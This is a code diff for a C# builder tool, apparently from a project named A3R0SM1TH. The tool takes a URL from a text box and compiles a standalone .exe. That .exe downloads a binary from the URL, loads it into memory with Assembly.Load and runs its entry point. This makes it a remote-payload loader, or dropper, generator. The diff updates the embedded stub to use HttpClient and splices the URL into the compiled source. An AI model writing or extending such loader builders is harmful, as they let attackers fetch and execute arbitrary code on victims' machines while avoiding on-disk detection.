@@ -39,26 +39,37 @@ namespace A3R0SM1TH
 		{
 			String url = fileLinkBox.Text;
 			String text = @"using System;
-			using System.Collections.Generic;
-			using System.IO;
-			using System.Linq;
-			using System.Net;
-			using System.Net.Http;
-			using System.Reflection;
-			using System.Text;
-			using System.Threading.Tasks;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Http;
+using System.Reflection;
+using System.Text;
+using System.Threading.Tasks;
 
-			namespace ConsoleApp1
+namespace ConsoleApp1
+{
+	class Program
+	{
+		static void Main(string[] args)
+		{
+			Download().GetAwaiter().GetResult();
+		}
+
+		static async Task Download()
+		{
+			using (var httpClient = new HttpClient())
 			{
-				class Program
+				using (var request = new HttpRequestMessage(HttpMethod.Get, ";
+			String text2 = @"))
 				{
-					static void Main(String[] args)
+					using (Stream contentStream = await(await httpClient.SendAsync(request)).Content.ReadAsStreamAsync())
 					{
-						WebClient client = new WebClient();
-						MemoryStream memStream = new MemoryStream(client.DownloadData(" + url + @"));
-						byte[] bin = memStream.ToArray();
-						String hex = BitConverter.ToString(bin);
-						memStream.Close();
+						MemoryStream memoryStream = new MemoryStream();
+						await contentStream.CopyToAsync(memoryStream);
+						byte[] bin = memoryStream.ToArray();
+						memoryStream.Close();
 
 						Assembly a = Assembly.Load(bin);
 						MethodInfo method = a.EntryPoint;
@@ -71,12 +82,16 @@ namespace A3R0SM1TH
 					}
 				}
 			}
-			";
+		}
+	}
+}
+
+";
 			saveDownloader.Filter = "exe files (*.exe)|.exe";
 			saveDownloader.Title = "Save the .exe File";
 			saveDownloader.ShowDialog();
 			String fileDownName = saveDownloader.FileName;
-			//System.IO.File.WriteAllText(saveDownloader.FileName, text);
+			System.IO.File.WriteAllText("test.cs", text + "\"" + url + "\"" + text2);
 
 			CSharpCodeProvider codeProvider = new CSharpCodeProvider();
 			ICodeCompiler icc = codeProvider.CreateCompiler();
@@ -85,11 +100,12 @@ namespace A3R0SM1TH
 			parameters.ReferencedAssemblies.Add("System.Net.dll");
 			parameters.ReferencedAssemblies.Add("System.Linq.dll");
 			parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
+			parameters.ReferencedAssemblies.Add("System.dll");
 
 			//Make sure we generate an EXE, not a DLL
 			parameters.GenerateExecutable = true;
 			parameters.OutputAssembly = fileDownName;
-			CompilerResults results = icc.CompileAssemblyFromSource(parameters, text);
+			CompilerResults results = icc.CompileAssemblyFromSource(parameters, text + "\"" + url + "\"" + text2);
 			if (results.Errors.Count > 0)
 			{
 				// Display compilation errors.
